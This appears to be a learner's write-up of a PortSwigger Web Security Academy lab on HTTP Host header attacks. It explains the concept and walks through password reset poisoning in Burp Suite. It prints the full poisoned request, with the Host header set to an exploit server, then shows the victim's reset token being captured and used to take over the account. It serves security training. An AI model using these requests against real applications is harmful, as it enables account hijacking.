# HTTP Host Header Attacks


## Vulnerability Definition



**HTTP Host Header Attacks** are vulnerabilities that occur when a web application or its infrastructure **implicitly trusts the 


user-controlled `Host` header** and uses it in a security-sensitive operation without proper validation.



An attacker may manipulate the `Host` header to influence server-side behavior, potentially leading to attacks such as:



- Password reset poisoning

- Web cache poisoning

- Authentication bypass

- Routing-based SSRF

- Virtual host attacks

- Other server-side vulnerabilities



The core issue is:




```text

Host header = User-controlled input

                    ↓

          Application trusts it

                    ↓

       Host affects server behavior



                    ↓

              Vulnerability

```



> **Key idea:** The vulnerability is not simply that the `Host` header can be changed. The vulnerability exists when changing it **affects 
security-sensitive behavior**.



---



## What is the HTTP Host Header?


The `Host` header specifies the domain/host that the client wants to access.



Example:



```http

GET / HTTP/1.1

Host: example.com

```



Because multiple websites can share the same IP address, servers and intermediary systems may use the `Host` header to determine which 
application or backend should handle the request.



---




## Why Can It Be Dangerous?



The `Host` header is controlled by the client and can therefore be modified using tools such as Burp Suite.



A vulnerable application may use it to generate absolute URLs:



```text

https://[Host]/reset-password

```



If the application does not validate the Host value, an attacker may supply:



```http

Host: attacker.com

```



causing the application to generate:



```text

https://attacker.com/reset-password

```



This can turn the Host header into an attack vector.



---



## Common Attack Types



```text

HTTP Host Header Attacks

│

├── Password Reset Poisoning

├── Web Cache Poisoning

├── Authentication Bypass

├── Routing-Based SSRF

├── Virtual Host Brute-Forcing

├── Connection State Attacks

└── Classic Server-Side Vulnerabilities

```



---




## Testing Methodology



When testing a Host Header vulnerability:



```text

1. Identify the Host header

        ↓

2. Modify its value

        ↓

3. Observe the application's behavior

        ↓
4. Identify where the Host value is used

        ↓
5. Determine whether the usage is security-sensitive

        ↓

6. Exploit the resulting behavior

```



### Important Question



Don't ask:



> Can I change the Host header?



Ask:



> **What does the application do with the Host header after I change it?**



---



# Lab: Basic Password Reset Poisoning



## Vulnerability Definition




**Password Reset Poisoning** is a vulnerability where an application uses the attacker-controlled `Host` header to construct a password 
reset URL.




By poisoning the Host header with an attacker-controlled domain, the attacker can cause the victim's reset link to point to the attacker's 

server. When the victim clicks the link, the password reset token can be captured by the attacker.



---



## Lab Goal



Log in to the `carlos` account.




Testing credentials:



```text

wiener:peter

```



---



## Core Idea



Normal flow:



```text

Password reset request

        ↓

Reset token generated

        ↓

Reset URL created

        ↓


URL sent via email

```



The vulnerable application uses the `Host` header when generating the reset URL.



Therefore:



```http

Host: attacker-server.exploit-server.net

```



can cause the application to generate a reset link pointing to the attacker's server.



---




## Exploitation Steps



### 1. Test the Normal Password Reset




Request a password reset for:



```text

wiener

```



Open:



```text

Exploit Server → Email client

```



Confirm that the email contains a reset token:


```text


temp-forgot-password-token=...

```



---

### 2. Find the Password Reset Request


In Burp:



```text

Proxy → HTTP history

```




Find:



```http

POST /forgot-password

```


Send it to Repeater.

---

### 3. Test Host Header Injection



Modify the Host header:



```http

POST /forgot-password HTTP/2

Host: abc123



csrf=...

&username=wiener

```



If the modified Host value appears in the password reset link, this confirms that the application uses the Host header when generating the 
URL.




---



### 4. Poison Carlos's Reset Link



Change the Host to the Exploit Server:



```http

POST /forgot-password HTTP/2

Host: YOUR-EXPLOIT-SERVER.exploit-server.net




csrf=...

&username=carlos

```



Send the request.




The application generates a password reset link pointing to the attacker-controlled Exploit Server.



---



### 5. Capture Carlos's Reset Token



Open:



```text


Exploit Server → Access log

```



Look for the request generated when Carlos clicks the poisoned link.




Example:



```http

GET /forgot-password?temp-forgot-password-token=CARLOS_TOKEN

```



Extract:



```text


CARLOS_TOKEN


```


---



### 6. Use the Token



Use the original **Lab domain**, but replace the original token with Carlos's token:



```text

https://LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=CARLOS_TOKEN

```



Set a new password.



Then log in:



```text

Username: carlos

Password: NEW_PASSWORD


```




---



## Why It Works




```text

User-controlled Host


        ↓


Application trusts Host
        ↓

Host used in reset URL

        ↓

Attacker changes Host

        ↓

Reset link points to attacker server

        ↓

Carlos clicks the link

        ↓
Reset token reaches attacker server

        ↓

Attacker obtains Carlos's token

        ↓

Token used on legitimate lab

        ↓

Carlos's password is changed

```



## Key Takeaway



For Host Header attacks:



```text


Host

 ↓

Where is it used?

 ↓


Does it affect security-sensitive behavior?

 ↓

Can I control the resulting behavior?


 ↓

Exploit

```



For Password Reset Poisoning specifically:



```text

Host


 ↓

Password Reset URL


 ↓
Attacker-controlled server

 ↓

Victim clicks

 ↓


Token leakage
```



### Important Burp Request



```http


POST /forgot-password HTTP/2

Host: YOUR-EXPLOIT-SERVER.exploit-server.net



csrf=...&username=carlos

```


## References



- PortSwigger Web Security Academy — HTTP Host header attacks

- PortSwigger Web Security Academy — Password reset poisoning